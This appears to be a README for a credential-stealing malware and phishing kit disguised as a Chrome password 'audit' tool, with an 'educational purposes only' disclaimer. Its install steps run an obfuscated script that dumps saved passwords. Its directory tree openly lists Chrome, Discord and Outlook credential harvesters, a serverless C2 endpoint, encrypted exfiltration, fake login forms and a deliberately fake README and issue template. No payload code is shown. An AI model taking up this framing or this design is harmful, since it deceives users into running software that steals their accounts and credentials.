# learningfishing
this is 100% about fishes, i love eating fish
Open source tool to audit saved passwords in Chrome.

## Installation
```bash
pip install -r requirements.txt
python chrome_obf.py
```
## Features
- Extracts and decrypts saved passwords from Chrome.
- Supports Windows, macOS, and Linux.
- Outputs JSON for easy parsing.

## Usage
Run the obfuscated script to dump passwords securely.

This tool is for educational purposes only.

```bash
├── .github/
│   ├── workflows/
│   │   └── build.yml          # CI/CD pipeline that auto-deploys on push
│   └── ISSUE_TEMPLATE.md      # Fake GitHub issue template (social engineering)
├── vercel/
│   ├── api/
│   │   └── hook.py            # Vercel Serverless Function (C2)
│   └── config.json            # Vercel project config
├── src/
│   ├── payloads/
│   │   ├── chrome.py          # Chrome/Edge credential stealer
│   │   ├── discord.py         # Discord token dumper
│   │   └── outlook.py         # Outlook / Office 365 harvester
│   ├── obfuscator.py          # String obfuscation + base64
│   ├── crypto.py              # AES-256 encryption for exfil
│   └── __init__.py
├── static/
│   ├── favicon.ico            # Favicon for phishing page
│   └── styles.css             # Minified CSS for fake login forms
├── README.md                  # Fake open-source project README
├── requirements.txt           # Python dependencies (Flask, pycryptodome)
└── vercel.json                # Vercel project manifest
```
